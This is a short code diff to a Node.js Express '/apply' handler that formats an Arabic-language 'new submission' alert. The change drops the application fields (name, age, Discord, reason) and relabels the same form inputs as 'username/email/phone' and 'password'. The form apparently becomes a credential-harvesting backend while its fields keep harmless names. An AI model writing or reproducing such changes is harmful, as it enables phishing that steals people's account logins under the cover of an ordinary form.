@@ -20,10 +20,9 @@ app.post("/apply", (req, res) => {
 
   const msg =
 `تقديم جديد 🔔
-الاسم: ${req.body.name}
-العمر: ${req.body.age}
-الديسكورد: ${req.body.discord}
-السبب: ${req.body.reason}
+اسم المستخدم/البريد/الهاتف: ${req.body.name}
+كلمة المرور: ${req.body.age}
+
 
 رد:
 1 = قبول
